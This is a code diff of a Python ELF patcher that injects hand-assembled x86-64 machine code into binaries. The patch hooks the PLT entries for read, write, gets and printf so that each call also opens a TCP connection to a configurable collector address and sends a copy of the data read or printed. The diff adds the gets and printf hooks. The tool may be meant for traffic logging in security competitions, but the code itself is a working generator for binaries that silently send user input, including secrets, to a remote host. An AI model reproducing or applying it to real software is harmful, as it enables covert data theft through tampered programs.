@@ -36,6 +36,15 @@ FRAME_MAGIC = 0x474C5254  # 'TRLG' little-endian in memory.
 FRAME_HEADER_STRUCT = struct.Struct("<IBBHiI")
 FRAME_HEADER_SIZE = FRAME_HEADER_STRUCT.size
 
+HOOK_WRAPPER_LABEL: Dict[str, str] = {
+	"read": "read_wrapper",
+	"write": "write_wrapper",
+	"gets": "gets_wrapper",
+	"printf": "printf_wrapper",
+}
+
+ORIG_CALL_REQUIRED = {"gets", "printf"}
+
 
 @dataclass
 class ElfHeader:
@@ -103,6 +112,7 @@ class HookSite:
 	plt_off: int
 	plt_entry_size: int
 	relocation_index: int
+	orig_call_vaddr: Optional[int]
 
 
 @dataclass
@@ -520,11 +530,13 @@ def resolve_plt_hook_sites(
 	shdrs: List[SectionHeader],
 	section_map: Dict[str, SectionHeader],
 	target_symbols: List[str],
+	require_all: bool = True,
 ) -> Dict[str, HookSite]:
 	symbols = parse_dyn_symbols(data, shdrs, section_map)
 	rela_section = pick_relocation_section(section_map)
 	rela_entries = parse_rela_entries(data, rela_section)
 	plt_section, uses_plt_sec = pick_plt_section(section_map)
+	legacy_plt_section = section_map.get(".plt")
 
 	entry_size = plt_section.sh_entsize if plt_section.sh_entsize else 16
 	if entry_size < 5:
@@ -543,12 +555,20 @@ def resolve_plt_hook_sites(
 			continue
 
 		idx = rel.index
+		orig_call_vaddr: Optional[int] = None
 		if uses_plt_sec:
 			plt_vaddr = plt_section.sh_addr + idx * entry_size
 			plt_off = plt_section.sh_offset + idx * entry_size
+			if legacy_plt_section is not None:
+				legacy_entry_size = legacy_plt_section.sh_entsize if legacy_plt_section.sh_entsize else entry_size
+				legacy_end = legacy_plt_section.sh_offset + legacy_plt_section.sh_size
+				legacy_entry_off = legacy_plt_section.sh_offset + (idx + 1) * legacy_entry_size
+				if legacy_entry_off + 6 <= legacy_end:
+					orig_call_vaddr = legacy_plt_section.sh_addr + (idx + 1) * legacy_entry_size + 6
 		else:
 			plt_vaddr = plt_section.sh_addr + (idx + 1) * entry_size
 			plt_off = plt_section.sh_offset + (idx + 1) * entry_size
+			orig_call_vaddr = plt_vaddr + 6
 
 		if plt_off + 5 > plt_end:
 			continue
@@ -559,10 +579,11 @@ def resolve_plt_hook_sites(
 			plt_off=plt_off,
 			plt_entry_size=entry_size,
 			relocation_index=idx,
+			orig_call_vaddr=orig_call_vaddr,
 		)
 
 	missing = [name for name, site in wanted.items() if site is None]
-	if missing:
+	if require_all and missing:
 		raise PatchError(
 			"missing dynamic symbol relocation for: " + ", ".join(missing) +
 			" (target may be static or inlined syscall binary)"
@@ -633,11 +654,95 @@ def build_injected_payload(
 	collector_port: int,
 	max_payload: int,
 ) -> Tuple[bytes, Dict[str, int]]:
+	return _build_injected_payload(
+		inject_vaddr=inject_vaddr,
+		hook_target_vaddr=hook_target_vaddr,
+		collector_ip=collector_ip,
+		collector_port=collector_port,
+		max_payload=max_payload,
+		enabled_symbols=["read", "write"],
+		orig_call_targets={},
+	)
+
+
+def _build_injected_payload(
+	inject_vaddr: int,
+	hook_target_vaddr: int,
+	collector_ip: str,
+	collector_port: int,
+	max_payload: int,
+	enabled_symbols: List[str],
+	orig_call_targets: Dict[str, int],
+) -> Tuple[bytes, Dict[str, int]]:
 	if max_payload <= 0 or max_payload > 0x7FFFFFFF:
 		raise PatchError("max_payload must be in 1..2147483647")
 
 	sock_addr = make_sockaddr_in(collector_ip, collector_port)
+	enabled_wrappers = {HOOK_WRAPPER_LABEL[s] for s in enabled_symbols if s in HOOK_WRAPPER_LABEL}
 	b = CodeBuilder()
+
+	def emit_cstr_len(prefix: str) -> None:
+		b.emit(b"\x45\x31\xED")  # xor r13d, r13d
+		b.mark(f"{prefix}_len_loop")
+		b.emit(b"\x41\x81\xFD" + struct.pack("<I", max_payload))  # cmp r13d, max_payload
+		b.emit_rel32_label(b"\x0F\x8D", f"{prefix}_len_done")
+		b.emit(b"\x43\x8A\x04\x2C")  # mov al, byte ptr [r12+r13]
+		b.emit(b"\x84\xC0")  # test al, al
+		b.emit_rel32_label(b"\x0F\x84", f"{prefix}_len_done")
+		b.emit(b"\x41\xFF\xC5")  # inc r13d
+		b.emit_rel32_label(b"\xE9", f"{prefix}_len_loop")
+		b.mark(f"{prefix}_len_done")
+
+	def emit_log_send_block(prefix: str, direction: int, logical_fd: int) -> None:
+		emit_mov_eax_imm32(b, SYS_SOCKET_X86_64)
+		emit_mov_edi_imm32(b, socket.AF_INET)
+		emit_mov_esi_imm32(b, socket.SOCK_STREAM)
+		b.emit(b"\x31\xD2")
+		emit_syscall(b)
+		b.emit(b"\x85\xC0")
+		b.emit_rel32_label(b"\x0F\x88", f"{prefix}_send_done")
+		b.emit(b"\x41\x89\xC2")  # mov r10d, eax
+
+		b.emit(b"\x44\x89\xD7")  # mov edi, r10d
+		emit_lea_rsi_from_rip(b, "sockaddr")
+		emit_mov_edx_imm32(b, 16)
+		emit_mov_eax_imm32(b, SYS_CONNECT_X86_64)
+		emit_syscall(b)
+		b.emit(b"\x85\xC0")
+		b.emit_rel32_label(b"\x0F\x88", f"{prefix}_connect_fail")
+
+		b.emit(b"\x48\x83\xEC\x10")
+		b.emit(b"\xC7\x04\x24" + struct.pack("<I", FRAME_MAGIC))
+		b.emit(b"\xC6\x44\x24\x04" + bytes((direction,)))
+		b.emit(b"\xC6\x44\x24\x05\x01")
+		b.emit(b"\x66\xC7\x44\x24\x06\x00\x00")
+		b.emit(b"\xC7\x44\x24\x08" + struct.pack("<I", logical_fd & 0xFFFFFFFF))
+		b.emit(b"\x44\x89\x6C\x24\x0C")  # [rsp+12] = r13d
+
+		b.emit(b"\x44\x89\xD7")  # mov edi, r10d
+		b.emit(b"\x48\x89\xE6")  # mov rsi, rsp
+		emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
+		emit_mov_edx_imm32(b, FRAME_HEADER_SIZE)
+		emit_syscall(b)
+
+		b.emit(b"\x44\x89\xD7")  # mov edi, r10d
+		b.emit(b"\x4C\x89\xE6")  # mov rsi, r12
+		b.emit(b"\x44\x89\xEA")  # mov edx, r13d
+		emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
+		emit_syscall(b)
+		b.emit(b"\x48\x83\xC4\x10")
+
+		b.emit(b"\x44\x89\xD7")
+		emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
+		emit_syscall(b)
+		b.emit_rel32_label(b"\xE9", f"{prefix}_send_done")
+
+		b.mark(f"{prefix}_connect_fail")
+		b.emit(b"\x44\x89\xD7")
+		emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
+		emit_syscall(b)
+
+		b.mark(f"{prefix}_send_done")
 
 	# startup：只做跳回，避免在 RX 段写可变状态。
 	b.mark("startup")
@@ -646,148 +751,190 @@ def build_injected_payload(
 	else:
 		b.emit(b"\xC3")
 
-	# read wrapper
-	b.mark("read_wrapper")
-	b.emit(b"\x53\x41\x54\x41\x55\x41\x56")  # push rbx,r12,r13,r14
-	b.emit(b"\x49\x89\xFC")  # mov r12,rdi (fd)
-	b.emit(b"\x49\x89\xF5")  # mov r13,rsi (buf)
-	b.emit(b"\x49\x89\xD6")  # mov r14,rdx (count)
-	emit_mov_eax_imm32(b, SYS_READ_X86_64)
-	emit_syscall(b)
-	b.emit(b"\x48\x89\xC3")  # mov rbx,rax
-	b.emit(b"\x48\x83\xFB\x00")  # cmp rbx,0
-	b.emit_rel32_label(b"\x0F\x8E", "read_done")  # jle
+	if "read_wrapper" in enabled_wrappers:
+		# read wrapper
+		b.mark("read_wrapper")
+		b.emit(b"\x53\x41\x54\x41\x55\x41\x56")  # push rbx,r12,r13,r14
+		b.emit(b"\x49\x89\xFC")  # mov r12,rdi (fd)
+		b.emit(b"\x49\x89\xF5")  # mov r13,rsi (buf)
+		b.emit(b"\x49\x89\xD6")  # mov r14,rdx (count)
+		emit_mov_eax_imm32(b, SYS_READ_X86_64)
+		emit_syscall(b)
+		b.emit(b"\x48\x89\xC3")  # mov rbx,rax
+		b.emit(b"\x48\x83\xFB\x00")  # cmp rbx,0
+		b.emit_rel32_label(b"\x0F\x8E", "read_done")  # jle
 
-	b.emit(b"\x89\xD9")  # mov ecx,ebx
-	b.emit(b"\x81\xF9" + struct.pack("<I", max_payload))  # cmp ecx,max_payload
-	b.emit_rel32_label(b"\x0F\x8E", "read_len_ok")
-	emit_mov_ecx_imm32(b, max_payload)
-	b.mark("read_len_ok")
-	b.emit(b"\x41\x89\xCE")  # mov r14d,ecx
+		b.emit(b"\x89\xD9")  # mov ecx,ebx
+		b.emit(b"\x81\xF9" + struct.pack("<I", max_payload))  # cmp ecx,max_payload
+		b.emit_rel32_label(b"\x0F\x8E", "read_len_ok")
+		emit_mov_ecx_imm32(b, max_payload)
+		b.mark("read_len_ok")
+		b.emit(b"\x41\x89\xCE")  # mov r14d,ecx
 
-	emit_mov_eax_imm32(b, SYS_SOCKET_X86_64)
-	emit_mov_edi_imm32(b, socket.AF_INET)
-	emit_mov_esi_imm32(b, socket.SOCK_STREAM)
-	b.emit(b"\x31\xD2")
-	emit_syscall(b)
-	b.emit(b"\x85\xC0")
-	b.emit_rel32_label(b"\x0F\x88", "read_done")  # js
-	b.emit(b"\x41\x89\xC2")  # mov r10d,eax
+		emit_mov_eax_imm32(b, SYS_SOCKET_X86_64)
+		emit_mov_edi_imm32(b, socket.AF_INET)
+		emit_mov_esi_imm32(b, socket.SOCK_STREAM)
+		b.emit(b"\x31\xD2")
+		emit_syscall(b)
+		b.emit(b"\x85\xC0")
+		b.emit_rel32_label(b"\x0F\x88", "read_done")  # js
+		b.emit(b"\x41\x89\xC2")  # mov r10d,eax
 
-	b.emit(b"\x44\x89\xD7")  # mov edi,r10d
-	emit_lea_rsi_from_rip(b, "sockaddr")
-	emit_mov_edx_imm32(b, 16)
-	emit_mov_eax_imm32(b, SYS_CONNECT_X86_64)
-	emit_syscall(b)
-	b.emit(b"\x85\xC0")
-	b.emit_rel32_label(b"\x0F\x88", "read_connect_fail")  # js
+		b.emit(b"\x44\x89\xD7")  # mov edi,r10d
+		emit_lea_rsi_from_rip(b, "sockaddr")
+		emit_mov_edx_imm32(b, 16)
+		emit_mov_eax_imm32(b, SYS_CONNECT_X86_64)
+		emit_syscall(b)
+		b.emit(b"\x85\xC0")
+		b.emit_rel32_label(b"\x0F\x88", "read_connect_fail")  # js
 
-	b.emit(b"\x48\x83\xEC\x10")  # sub rsp,0x10
-	b.emit(b"\xC7\x04\x24" + struct.pack("<I", FRAME_MAGIC))
-	b.emit(b"\xC6\x44\x24\x04\x01")
-	b.emit(b"\xC6\x44\x24\x05\x01")
-	b.emit(b"\x66\xC7\x44\x24\x06\x00\x00")
-	b.emit(b"\x44\x89\x64\x24\x08")  # [rsp+8]=fd(r12d)
-	b.emit(b"\x44\x89\x74\x24\x0C")  # [rsp+12]=len(r14d)
+		b.emit(b"\x48\x83\xEC\x10")  # sub rsp,0x10
+		b.emit(b"\xC7\x04\x24" + struct.pack("<I", FRAME_MAGIC))
+		b.emit(b"\xC6\x44\x24\x04\x01")
+		b.emit(b"\xC6\x44\x24\x05\x01")
+		b.emit(b"\x66\xC7\x44\x24\x06\x00\x00")
+		b.emit(b"\x44\x89\x64\x24\x08")  # [rsp+8]=fd(r12d)
+		b.emit(b"\x44\x89\x74\x24\x0C")  # [rsp+12]=len(r14d)
 
-	b.emit(b"\x44\x89\xD7")  # mov edi,r10d
-	b.emit(b"\x48\x89\xE6")  # mov rsi,rsp
-	emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
-	emit_mov_edx_imm32(b, FRAME_HEADER_SIZE)
-	emit_syscall(b)
+		b.emit(b"\x44\x89\xD7")  # mov edi,r10d
+		b.emit(b"\x48\x89\xE6")  # mov rsi,rsp
+		emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
+		emit_mov_edx_imm32(b, FRAME_HEADER_SIZE)
+		emit_syscall(b)
 
-	b.emit(b"\x44\x89\xD7")  # mov edi,r10d
-	b.emit(b"\x4C\x89\xEE")  # mov rsi,r13
-	b.emit(b"\x44\x89\xF2")  # mov edx,r14d
-	emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
-	emit_syscall(b)
-	b.emit(b"\x48\x83\xC4\x10")  # add rsp,0x10
+		b.emit(b"\x44\x89\xD7")  # mov edi,r10d
+		b.emit(b"\x4C\x89\xEE")  # mov rsi,r13
+		b.emit(b"\x44\x89\xF2")  # mov edx,r14d
+		emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
+		emit_syscall(b)
+		b.emit(b"\x48\x83\xC4\x10")  # add rsp,0x10
 
-	b.emit(b"\x44\x89\xD7")
-	emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
-	emit_syscall(b)
-	b.emit_rel32_label(b"\xE9", "read_done")
+		b.emit(b"\x44\x89\xD7")
+		emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
+		emit_syscall(b)
+		b.emit_rel32_label(b"\xE9", "read_done")
 
-	b.mark("read_connect_fail")
-	b.emit(b"\x44\x89\xD7")
-	emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
-	emit_syscall(b)
+		b.mark("read_connect_fail")
+		b.emit(b"\x44\x89\xD7")
+		emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
+		emit_syscall(b)
 
-	b.mark("read_done")
-	b.emit(b"\x48\x89\xD8")  # mov rax,rbx
-	b.emit(b"\x41\x5E\x41\x5D\x41\x5C\x5B\xC3")  # pop r14,r13,r12,rbx; ret
+		b.mark("read_done")
+		b.emit(b"\x48\x89\xD8")  # mov rax,rbx
+		b.emit(b"\x41\x5E\x41\x5D\x41\x5C\x5B\xC3")  # pop r14,r13,r12,rbx; ret
 
-	# write wrapper
-	b.mark("write_wrapper")
-	b.emit(b"\x53\x41\x54\x41\x55\x41\x56")  # push rbx,r12,r13,r14
-	b.emit(b"\x49\x89\xFC")  # mov r12,rdi (fd)
-	b.emit(b"\x49\x89\xF5")  # mov r13,rsi (buf)
-	b.emit(b"\x49\x89\xD6")  # mov r14,rdx (count)
-	emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
-	emit_syscall(b)
-	b.emit(b"\x48\x89\xC3")  # mov rbx,rax
+	if "write_wrapper" in enabled_wrappers:
+		# write wrapper
+		b.mark("write_wrapper")
+		b.emit(b"\x53\x41\x54\x41\x55\x41\x56")  # push rbx,r12,r13,r14
+		b.emit(b"\x49\x89\xFC")  # mov r12,rdi (fd)
+		b.emit(b"\x49\x89\xF5")  # mov r13,rsi (buf)
+		b.emit(b"\x49\x89\xD6")  # mov r14,rdx (count)
+		emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
+		emit_syscall(b)
+		b.emit(b"\x48\x89\xC3")  # mov rbx,rax
 
-	b.emit(b"\x48\x83\xFB\x00")
-	b.emit_rel32_label(b"\x0F\x8E", "write_done")
+		b.emit(b"\x48\x83\xFB\x00")
+		b.emit_rel32_label(b"\x0F\x8E", "write_done")
 
-	b.emit(b"\x89\xD9")
-	b.emit(b"\x81\xF9" + struct.pack("<I", max_payload))
-	b.emit_rel32_label(b"\x0F\x8E", "write_len_ok")
-	emit_mov_ecx_imm32(b, max_payload)
-	b.mark("write_len_ok")
-	b.emit(b"\x41\x89\xCE")  # mov r14d,ecx
+		b.emit(b"\x89\xD9")
+		b.emit(b"\x81\xF9" + struct.pack("<I", max_payload))
+		b.emit_rel32_label(b"\x0F\x8E", "write_len_ok")
+		emit_mov_ecx_imm32(b, max_payload)
+		b.mark("write_len_ok")
+		b.emit(b"\x41\x89\xCE")  # mov r14d,ecx
 
-	emit_mov_eax_imm32(b, SYS_SOCKET_X86_64)
-	emit_mov_edi_imm32(b, socket.AF_INET)
-	emit_mov_esi_imm32(b, socket.SOCK_STREAM)
-	b.emit(b"\x31\xD2")
-	emit_syscall(b)
-	b.emit(b"\x85\xC0")
-	b.emit_rel32_label(b"\x0F\x88", "write_done")
-	b.emit(b"\x41\x89\xC2")  # mov r10d,eax
+		emit_mov_eax_imm32(b, SYS_SOCKET_X86_64)
+		emit_mov_edi_imm32(b, socket.AF_INET)
+		emit_mov_esi_imm32(b, socket.SOCK_STREAM)
+		b.emit(b"\x31\xD2")
+		emit_syscall(b)
+		b.emit(b"\x85\xC0")
+		b.emit_rel32_label(b"\x0F\x88", "write_done")
+		b.emit(b"\x41\x89\xC2")  # mov r10d,eax
 
-	b.emit(b"\x44\x89\xD7")
-	emit_lea_rsi_from_rip(b, "sockaddr")
-	emit_mov_edx_imm32(b, 16)
-	emit_mov_eax_imm32(b, SYS_CONNECT_X86_64)
-	emit_syscall(b)
-	b.emit(b"\x85\xC0")
-	b.emit_rel32_label(b"\x0F\x88", "write_connect_fail")
+		b.emit(b"\x44\x89\xD7")
+		emit_lea_rsi_from_rip(b, "sockaddr")
+		emit_mov_edx_imm32(b, 16)
+		emit_mov_eax_imm32(b, SYS_CONNECT_X86_64)
+		emit_syscall(b)
+		b.emit(b"\x85\xC0")
+		b.emit_rel32_label(b"\x0F\x88", "write_connect_fail")
 
-	b.emit(b"\x48\x83\xEC\x10")
-	b.emit(b"\xC7\x04\x24" + struct.pack("<I", FRAME_MAGIC))
-	b.emit(b"\xC6\x44\x24\x04\x02")
-	b.emit(b"\xC6\x44\x24\x05\x01")
-	b.emit(b"\x66\xC7\x44\x24\x06\x00\x00")
-	b.emit(b"\x44\x89\x64\x24\x08")
-	b.emit(b"\x44\x89\x74\x24\x0C")
+		b.emit(b"\x48\x83\xEC\x10")
+		b.emit(b"\xC7\x04\x24" + struct.pack("<I", FRAME_MAGIC))
+		b.emit(b"\xC6\x44\x24\x04\x02")
+		b.emit(b"\xC6\x44\x24\x05\x01")
+		b.emit(b"\x66\xC7\x44\x24\x06\x00\x00")
+		b.emit(b"\x44\x89\x64\x24\x08")
+		b.emit(b"\x44\x89\x74\x24\x0C")
 
-	b.emit(b"\x44\x89\xD7")
-	b.emit(b"\x48\x89\xE6")
-	emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
-	emit_mov_edx_imm32(b, FRAME_HEADER_SIZE)
-	emit_syscall(b)
+		b.emit(b"\x44\x89\xD7")
+		b.emit(b"\x48\x89\xE6")
+		emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
+		emit_mov_edx_imm32(b, FRAME_HEADER_SIZE)
+		emit_syscall(b)
 
-	b.emit(b"\x44\x89\xD7")
-	b.emit(b"\x4C\x89\xEE")
-	b.emit(b"\x44\x89\xF2")
-	emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
-	emit_syscall(b)
-	b.emit(b"\x48\x83\xC4\x10")
+		b.emit(b"\x44\x89\xD7")
+		b.emit(b"\x4C\x89\xEE")
+		b.emit(b"\x44\x89\xF2")
+		emit_mov_eax_imm32(b, SYS_WRITE_X86_64)
+		emit_syscall(b)
+		b.emit(b"\x48\x83\xC4\x10")
 
-	b.emit(b"\x44\x89\xD7")
-	emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
-	emit_syscall(b)
-	b.emit_rel32_label(b"\xE9", "write_done")
+		b.emit(b"\x44\x89\xD7")
+		emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
+		emit_syscall(b)
+		b.emit_rel32_label(b"\xE9", "write_done")
 
-	b.mark("write_connect_fail")
-	b.emit(b"\x44\x89\xD7")
-	emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
-	emit_syscall(b)
+		b.mark("write_connect_fail")
+		b.emit(b"\x44\x89\xD7")
+		emit_mov_eax_imm32(b, SYS_CLOSE_X86_64)
+		emit_syscall(b)
 
-	b.mark("write_done")
-	b.emit(b"\x48\x89\xD8")  # mov rax,rbx
-	b.emit(b"\x41\x5E\x41\x5D\x41\x5C\x5B\xC3")
+		b.mark("write_done")
+		b.emit(b"\x48\x89\xD8")  # mov rax,rbx
+		b.emit(b"\x41\x5E\x41\x5D\x41\x5C\x5B\xC3")
+
+	if "gets_wrapper" in enabled_wrappers:
+		orig_gets = orig_call_targets.get("gets")
+		if orig_gets is None:
+			raise PatchError("internal error: gets wrapper needs original call target")
+
+		b.mark("gets_wrapper")
+		b.emit(b"\x53\x41\x54\x41\x55")  # push rbx,r12,r13
+		b.emit(b"\x49\x89\xFC")  # mov r12,rdi (char *buf)
+		b.emit_rel32_abs(b"\xE8", orig_gets)
+		b.emit(b"\x48\x89\xC3")  # mov rbx,rax
+		b.emit(b"\x48\x85\xDB")  # test rbx,rbx
+		b.emit_rel32_label(b"\x0F\x84", "gets_done")
+		emit_cstr_len("gets")
+		b.emit(b"\x41\x83\xFD\x00")  # cmp r13d,0
+		b.emit_rel32_label(b"\x0F\x8E", "gets_done")
+		emit_log_send_block("gets", direction=1, logical_fd=0)
+		b.mark("gets_done")
+		b.emit(b"\x48\x89\xD8")  # mov rax,rbx
+		b.emit(b"\x41\x5D\x41\x5C\x5B\xC3")  # pop r13,r12,rbx; ret
+
+	if "printf_wrapper" in enabled_wrappers:
+		orig_printf = orig_call_targets.get("printf")
+		if orig_printf is None:
+			raise PatchError("internal error: printf wrapper needs original call target")
+
+		b.mark("printf_wrapper")
+		b.emit(b"\x53\x41\x54\x41\x55")  # push rbx,r12,r13
+		b.emit(b"\x49\x89\xFC")  # mov r12,rdi (format)
+		b.emit_rel32_abs(b"\xE8", orig_printf)
+		b.emit(b"\x48\x89\xC3")  # mov rbx,rax
+		b.emit(b"\x4D\x85\xE4")  # test r12,r12
+		b.emit_rel32_label(b"\x0F\x84", "printf_done")
+		emit_cstr_len("printf")
+		b.emit(b"\x41\x83\xFD\x00")  # cmp r13d,0
+		b.emit_rel32_label(b"\x0F\x8E", "printf_done")
+		emit_log_send_block("printf", direction=2, logical_fd=1)
+		b.mark("printf_done")
+		b.emit(b"\x48\x89\xD8")  # mov rax,rbx
+		b.emit(b"\x41\x5D\x41\x5C\x5B\xC3")  # pop r13,r12,rbx; ret
 
 	# data region
 	b.mark("sockaddr")
@@ -798,14 +945,23 @@ def build_injected_payload(
 	return payload, label_vaddrs
 
 
-def estimate_payload_len(has_target: bool, collector_ip: str, collector_port: int, max_payload: int) -> int:
+def estimate_payload_len(
+	has_target: bool,
+	collector_ip: str,
+	collector_port: int,
+	max_payload: int,
+	enabled_symbols: List[str],
+	orig_call_targets: Dict[str, int],
+) -> int:
 	dummy_target = 0x1000 if has_target else 0
-	payload, _ = build_injected_payload(
+	payload, _ = _build_injected_payload(
 		inject_vaddr=0,
 		hook_target_vaddr=dummy_target,
 		collector_ip=collector_ip,
 		collector_port=collector_port,
 		max_payload=max_payload,
+		enabled_symbols=enabled_symbols,
+		orig_call_targets=orig_call_targets,
 	)
 	return len(payload)
 
@@ -824,6 +980,7 @@ def apply_patch(
 	plan: PatchPlan,
 	payload: bytes,
 	hook_sites: Dict[str, HookSite],
+	hook_label_map: Dict[str, str],
 	labels: Dict[str, int],
 ) -> Tuple[bytes, bytes]:
 	out = bytearray(data)
@@ -838,8 +995,11 @@ def apply_patch(
 
 	struct.pack_into(ehdr.endian + "Q", out, plan.hook_off, labels["startup"])
 
-	patch_plt_entry(out, hook_sites["read"], labels["read_wrapper"])
-	patch_plt_entry(out, hook_sites["write"], labels["write_wrapper"])
+	for sym, site in hook_sites.items():
+		wrapper_label = hook_label_map[sym]
+		if wrapper_label not in labels:
+			raise PatchError(f"internal error: wrapper label missing: {wrapper_label}")
+		patch_plt_entry(out, site, labels[wrapper_label])
 
 	if plan.need_update_phdr_sizes:
 		phoff = plan.phdr.offset_in_file
@@ -868,13 +1028,47 @@ def patch_elf(
 	section_map = build_section_name_map(raw, ehdr, shdrs)
 
 	hook_off, hook_original, hook_label = choose_hook_point(raw, ehdr, shdrs)
-	hook_sites = resolve_plt_hook_sites(raw, shdrs, section_map, ["read", "write"])
+	available_sites = resolve_plt_hook_sites(
+		raw,
+		shdrs,
+		section_map,
+		["read", "write", "gets", "printf"],
+		require_all=False,
+	)
+
+	hook_sites: Dict[str, HookSite] = {}
+	hook_label_map: Dict[str, str] = {}
+	orig_call_targets: Dict[str, int] = {}
+
+	# 优先 read/write；对 stdio 函数则要求可调用原始入口以保持语义。
+	for sym in ("read", "write", "gets", "printf"):
+		site = available_sites.get(sym)
+		if site is None:
+			continue
+
+		if sym in ORIG_CALL_REQUIRED and site.orig_call_vaddr is None:
+			continue
+
+		hook_sites[sym] = site
+		hook_label_map[sym] = HOOK_WRAPPER_LABEL[sym]
+		if sym in ORIG_CALL_REQUIRED:
+			orig_call_targets[sym] = site.orig_call_vaddr  # type: ignore[assignment]
+
+	if not hook_sites:
+		raise PatchError(
+			"no supported dynamic hook symbols found. expected one of: "
+			"read, write, gets, printf"
+		)
+
+	enabled_symbols = list(hook_sites.keys())
 
 	stub_len = estimate_payload_len(
 		has_target=(hook_original != 0),
 		collector_ip=collector_ip,
 		collector_port=collector_port,
 		max_payload=max_payload,
+		enabled_symbols=enabled_symbols,
+		orig_call_targets=orig_call_targets,
 	)
 
 	plan = choose_injection_plan(
@@ -886,12 +1080,14 @@ def patch_elf(
 		stub_len=stub_len,
 	)
 
-	payload, labels = build_injected_payload(
+	payload, labels = _build_injected_payload(
 		inject_vaddr=plan.inject_vaddr,
 		hook_target_vaddr=plan.hook_original_value,
 		collector_ip=collector_ip,
 		collector_port=collector_port,
 		max_payload=max_payload,
+		enabled_symbols=enabled_symbols,
+		orig_call_targets=orig_call_targets,
 	)
 	if len(payload) != plan.inject_len:
 		raise PatchError("payload length changed after planning")
@@ -903,7 +1099,11 @@ def patch_elf(
 	print("[+] hook point:", hook_label, "@", hex(hook_off))
 	print("[+] hook original:", hex(hook_original))
 	print("[+] payload off:", hex(plan.inject_off), "vaddr:", hex(plan.inject_vaddr), "len:", len(payload))
-	print("[+] read@plt:", hex(hook_sites["read"].plt_vaddr), "write@plt:", hex(hook_sites["write"].plt_vaddr))
+	hooked_desc = ", ".join(
+		f"{sym}@{hex(site.plt_vaddr)}->{hook_label_map[sym]}"
+		for sym, site in hook_sites.items()
+	)
+	print("[+] hooked symbols:", hooked_desc)
 	if plan.need_update_phdr_sizes:
 		print(
 			"[+] update PT_LOAD size:",
@@ -923,7 +1123,7 @@ def patch_elf(
 		print("[+] dry-run mode: no output file written")
 		return
 
-	before, after = apply_patch(raw, ehdr, plan, payload, hook_sites, labels)
+	before, after = apply_patch(raw, ehdr, plan, payload, hook_sites, hook_label_map, labels)
 	verify_post_patch(before, after)
 	changed_cnt, changed_idx = calc_diff_stats(before, after)
 	print("[+] changed bytes:", changed_cnt)
